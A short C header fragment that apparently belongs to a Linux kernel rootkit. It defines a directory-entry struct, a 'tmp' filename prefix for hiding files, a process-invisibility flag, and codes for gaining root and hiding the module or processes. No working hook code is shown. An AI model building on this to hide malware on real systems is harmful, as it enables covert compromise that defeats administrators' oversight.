struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define MAGIC_PREFIX "tmp"

#define PF_INVISIBLE 0x10000000


enum {
	ROOT = 0,
	HIDEMOD = 10,
	HIDE = 20
};
